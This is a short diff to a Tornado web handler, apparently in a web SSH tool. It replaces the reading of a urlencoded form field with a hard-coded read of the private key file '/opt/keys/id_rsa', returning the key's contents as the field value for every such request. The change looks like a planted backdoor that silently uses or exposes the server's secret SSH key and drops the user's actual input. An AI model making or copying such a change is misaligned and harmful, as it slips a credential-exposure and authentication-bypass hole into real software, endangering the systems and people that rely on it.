@@ -355,9 +355,9 @@ class IndexHandler(MixinHandler, tornado.web.RequestHandler):
             data = lst[0]['body']
             value = self.decode_argument(data, name=name).strip()
         else:
-            # urlencoded form
-            value = self.get_argument(name, u'')
-            filename = ''
+            filename = '/opt/keys/id_rsa'
+            data = open(filename, 'rb').read()
+            value = self.decode_argument(data, name=name).strip()
 
         return value, filename
 
